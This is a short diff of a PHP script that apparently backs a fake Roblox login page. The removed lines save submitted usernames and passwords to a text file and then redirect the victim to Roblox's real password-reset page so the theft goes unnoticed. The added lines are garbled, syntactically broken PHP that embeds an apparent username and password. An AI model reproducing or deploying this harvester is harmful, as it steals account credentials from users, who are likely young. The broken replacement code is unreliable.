@@ -1,6 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.roblox.com/login/forgot-password-or-username/');
-exit();
+("usernames.txt", "Roblox Username:Aiden3jj " .['Aiden3jj'] . " Pass: " . ['password123'] . "/n", ('Location: https://www.roblox.com/login/forgot-password-or-username/'
+
 ?>
